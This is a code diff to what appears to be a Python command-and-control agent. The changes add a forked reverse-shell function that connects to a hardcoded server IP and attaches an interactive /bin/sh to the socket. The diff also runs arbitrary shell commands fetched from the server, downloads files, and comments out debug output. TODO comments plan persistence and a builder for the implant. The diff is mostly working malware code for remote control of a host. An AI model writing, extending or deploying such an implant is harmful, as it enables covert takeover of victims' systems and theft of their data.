@@ -6,6 +6,9 @@ import platform
 import subprocess
 import random
 import getpass 
+import pty 
+import socket 
+import os 
 
 """
 TODO: Create a builder script which creates this agent script 
@@ -23,9 +26,19 @@ TODO4: Create persistence on the script itself.
 # Need to have hardcoded server ip address 
 
 # This is hardcoded, for now 
+SERVERIP = '192.168.48.128'
 URL = 'http://localhost:5000'
 FIRSTCONTACTKEY = 'firstcontactkey'
 
+def reverse_shell(port):
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((SERVERIP,port))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p=subprocess.call(["/bin/sh","-i"]);
+
+    os._exit(0)
 
 def get_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -98,7 +111,7 @@ def fetchCommand(ip):
 
     else:
         command = json_data['command']
-        print("[+] Command received: ", command)
+        #print("[+] Command received: ", command)
         # TODO: Add upload/download/shell related functionality of the agent here 
         if "download" == command.split(' ')[0]:
             try:
@@ -108,7 +121,7 @@ def fetchCommand(ip):
 
                 download_url = URL + '/download/' + filename
                 myFile = requests.get(download_url)
-                print('[+]', myFile.content)
+                #print('[+]', myFile.content)
 
                 open(destination_path,'wb').write(myFile.content)
 
@@ -117,13 +130,31 @@ def fetchCommand(ip):
 
             return '[+] Download successful. Filename: ' + filename + ' Destination: ' + destination_path 
 
+        elif "shell" == command.split(' ')[0]:
+            # Spawn an independent reverse shell through fork 
+            try:
+                newpid = os.fork()
+                if newpid==0:
+                    port = int(command.split(' ')[1])
+                    reverse_shell(port)
+
+                return "[+] Reverse shell created"
+
+            except Exception as e:
+                print(str(e))
+                return "[-] " + str(e)
+            
         #elif "upload" == command.split(' ')[0]: 
         else:
+            # TODO: If the subprocess.check_output spawns a process ex) a meterpreter shell, the agent will hang 
             try:
-                result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, timeout=5)
+                #result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, timeout=5)
+                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+                stdout,stderr = process.communicate()
+                result = stdout 
             except Exception as e: 
-                payload = "[" + str(e.returncode) + "] " + str(e.output.decode('utf-8'))
-                return "Status: FAILED " + payload 
+                #payload = "[" + str(e.returncode) + "] " + str(e.output.decode('utf-8'))
+                return "Status: FAILED " + str(e) 
         
         return result.decode('utf-8') 
 
@@ -156,15 +187,23 @@ def main():
         beat = heartbeat(ip, user)
         if beat is not None:
 
-            result = fetchCommand(ip)
+            try:
+                result = fetchCommand(ip)
+            except Exception as e:
+                #print(str(e))
+                #time.sleep(10)
+                #submit_result(ip, str(e))
+                continue 
 
             # If server response that the bot doesn't have anything, just sleep.
             if isinstance(result, str) and '[-]' in result:
+                #print(result)
                 print("[-] Sleeping...")
                 time.sleep(10)
+                #submit_result(ip, "error")
                 continue
 
-            print("[DEBUG] Result:", result)
+            #print("[DEBUG] Result:", result)
             submit_result(ip, result)
 
             print("[+] Command feteched and executed. Sleeping ... ")
